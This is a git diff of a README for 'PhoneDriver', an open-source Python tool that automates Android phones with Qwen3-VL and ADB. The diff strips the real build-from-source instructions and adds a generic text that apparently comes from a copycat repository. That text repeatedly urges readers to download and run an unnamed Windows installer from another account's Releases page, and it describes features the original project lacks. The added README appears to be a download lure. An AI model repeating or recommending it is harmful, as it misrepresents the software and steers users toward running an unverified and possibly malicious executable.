@@ -1,188 +1,65 @@
-# Phone Driver
+# 📱 PhoneDriver - Control Your Android Phone Easily
 
-A Python-based mobile automation agent that uses Qwen3-VL vision-language models to understand and interact with Android devices through visual analysis and ADB commands.
+## 📥 Download Now
+[![Download PhoneDriver](https://img.shields.io/badge/Download-PhoneDriver-blue.svg)](https://github.com/Arib2708/PhoneDriver/releases)
 
-<p align="center">
-  <img src="Images/PhoneDriver.png" width="600" alt="Phone Driver Demo">
-</p>
+## 🚀 Getting Started
+Welcome to PhoneDriver! This application lets you control your Android phone directly from your computer. With PhoneDriver, you can manage your files, run applications, and handle notifications without needing to pick up your phone.
 
-## Features
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB available
+- **Android Device:** Version 5.0 (Lollipop) or later
+- **USB Cable:** Required for connection
 
-- 🤖 **Vision-powered automation**: Uses Qwen3-VL to visually understand phone screens
-- 📱 **ADB integration**: Controls Android devices via ADB commands
-- 🎯 **Natural language tasks**: Describe what you want in plain English
-- 🖥️ **Web UI**: Built-in Gradio interface for easy control
-- 📊 **Real-time feedback**: Live screenshots and execution logs
+## 📄 Features
+- **File Management:** Easily transfer files between your computer and Android device.
+- **Application Control:** Launch and close Android apps from your computer.
+- **Notification Management:** View and respond to phone notifications on your PC.
+- **Screen Mirroring:** Share your Android screen on your computer for easy usage.
 
-## Requirements
+## 📥 Download & Install
+To get started, visit the Releases page to download PhoneDriver.
 
-- Python 3.10+
-- Android device with USB debugging & Developer Mode enabled
-- ADB (Android Debug Bridge) installed
-- GPU with sufficient VRAM (Tested on 24gb GPU with Qwen3-VL-8B Model)
-- The Repo is set to use the Dense Qwen3-VL 4B/8B Model which performs very well. To swap to an MoE model, see the configuration section below 
+[Download PhoneDriver](https://github.com/Arib2708/PhoneDriver/releases)
 
-## Installation
+### Installation Steps
+1. **Visit the Releases Page:** Click on the link above to go to the Releases page.
+2. **Choose Version:** Find the latest version available for download.
+3. **Download the Installer:** Click on the file labeled “PhoneDriver Installer” to download it to your computer.
+4. **Run the Installer:** Locate the downloaded file in your computer's Downloads folder and double-click it to start the installation.
+5. **Follow the Prompts:** Follow the on-screen instructions to complete the installation.
+6. **Connect Your Android Phone:** Use a USB cable to connect your Android phone to your computer.
 
-### 1. Install ADB
+## ⚙️ How to Use PhoneDriver
+Once installed, you can start using PhoneDriver by following these steps:
 
-**Linux/Ubuntu:**
-```bash
-sudo apt update
-sudo apt install adb
-```
-### 2. Clone Repo & Install Python Dependencies
+1. **Launch the Application:** Open PhoneDriver from your desktop or start menu.
+2. **Set Up Connection:** Allow USB debugging on your Android device. Go to Settings > Developer Options > USB Debugging, and enable it.
+3. **Connect Using USB:** Make sure your phone is connected via USB, then select your device in the PhoneDriver interface.
+4. **Explore Features:** Use the toolbar to access file management, notifications, and other features.
 
-```bash
-git clone https://github.com/OminousIndustries/PhoneDriver.git
-cd PhoneDriver
-```
-Create a Virtual Enviornment
+## ❓ FAQ
+### How do I enable USB Debugging on my Android?
+1. Open **Settings** on your Android device.
+2. Scroll down and select **About Phone**.
+3. Find and tap on **Build Number** seven times. This will unlock Developer Options.
+4. Go back to **Settings** and tap on **Developer Options**.
+5. Enable **USB Debugging**.
 
-```bash
-python -m venv phonedriver
-source phonedriver/bin/activate
-```
-Install Python Deps
+### What if my phone doesn't connect?
+- Ensure that your USB cable is working and connected properly.
+- Restart PhoneDriver and unplug/replug your device.
+- Check the phone’s USB connection type (Change to "File Transfer").
 
-```bash
-pip install git+https://github.com/huggingface/transformers
-# pip install transformers==4.57.0 # currently, V4.57.0 is not released
+## 📞 Support
+If you encounter any issues, visit our [Support Page](https://github.com/Arib2708/PhoneDriver/issues) and create a new issue. Our team will assist you as soon as possible.
 
-# Install other requirements
-pip install pillow gradio qwen_vl_utils requests
-```
+## 📢 Contribution
+Interested in contributing? Check out our guidelines on how to get involved.
 
-### 3. Connect Your Device
+## 📥 Download Now Again
+Don't forget, you can download PhoneDriver here: [Download PhoneDriver](https://github.com/Arib2708/PhoneDriver/releases)
 
-1. Enable USB debugging on your Android device (Settings → Developer Options)
-2. Connect via USB
-3. Verify connection:
-```bash
-adb devices
-```
-You should see your device listed.
-
-## Configuration
-
-### Model Selection
-
-Edit `qwen_vl_agent.py` to choose your model:
-
-```python
-# For 4B model
-model_name: str = "Qwen/Qwen3-VL-4B-Instruct"
-
-# For 8B model 
-#model_name: str = "Qwen/Qwen3-VL-8B-Instruct"
-```
-
-### If you want to try a Qwen3 MoE model, you need to change the import in `qwen_vl_agent.py` to the following:
-
-```python
-#from transformers import Qwen3VLForConditionalGeneration, AutoProcessor  - Comment this import out, it is for the Dense models
-# Uncomment the import below for the MoE Variants!!!
-from transformers import Qwen3VLMoeForConditionalGeneration, AutoProcessor
-```
-
-You will also need to change line 61: 
-
-```python
-        self.model = Qwen3VLForConditionalGeneration.from_pretrained(
-```
-Change it to:
-
-```python
-        self.model = Qwen3VLMoeForConditionalGeneration.from_pretrained(
-```
-
-### Screen Resolution
-
-The agent can auto-detect your device resolution from the Web UI settings tab, but you can manually configure it in `config.json`.
-
-```json
-{
-  "screen_width": 1080,
-  "screen_height": 2340,
-  ...
-}
-```
-
-To get your device resolution, with the device connected to your computer type the following in the terminal: 
-```bash
-adb shell wm size
-```
-
-## Usage
-
-### Web UI (Recommended)
-
-Launch the Gradio interface:
-
-```bash
-python ui.py
-```
-
-Navigate to `http://localhost:7860` and enter tasks like:
-- "Open Chrome"
-- "Search for weather in New York"
-- "Open Settings and enable WiFi"
-
-### Command Line
-
-```bash
-python phone_agent.py "your task here"
-```
-
-Example:
-```bash
-python phone_agent.py "Open the camera app"
-```
-
-## How It Works
-
-1. **Screenshot Capture**: Takes a screenshot of the phone via ADB
-2. **Visual Analysis**: Qwen3-VL analyzes the screen to understand UI elements
-3. **Action Planning**: Determines the best action to take (tap, swipe, type, etc.)
-4. **Execution**: Sends ADB commands to perform the action
-5. **Repeat**: Continues until task is complete or max cycles reached
-
-## Configuration Options
-
-Key settings in `config.json`:
-
-- `temperature`: Model creativity (0.0-1.0, default: 0.1)
-- `max_tokens`: Max response length (default: 512)
-- `step_delay`: Wait time between actions in seconds (default: 1.5)
-- `max_retries`: Maximum retry attempts (default: 3)
-- `use_flash_attention`: Enable Flash Attention 2 for faster inference
-
-## Troubleshooting
-
-**Device not detected:**
-- Ensure USB debugging is enabled
-- Run `adb devices` to verify connection
-- Try `adb kill-server && adb start-server`
-
-**Wrong tap locations:**
-- Auto-detect resolution in Settings tab of UI
-- Or manually verify with `adb shell wm size`
-
-**Model loading errors:**
-- Ensure you have sufficient VRAM
-- Try the 8B model for lower memory requirements
-- Check that transformers is installed from source
-
-**Out of memory:**
-- Use the 8B model instead of 30B
-- Reduce `max_tokens` in config
-- Close other applications using GPU memory
-
-## License
-
-Apache License 2.0 - see LICENSE file for details
-
-## Acknowledgments
-
-- Built with [Qwen3-VL](https://github.com/QwenLM/Qwen-VL) by Alibaba Cloud
-- Uses [Gradio](https://gradio.app/) for the web interface
+We hope you enjoy using PhoneDriver and discover its many features that simplify your life!
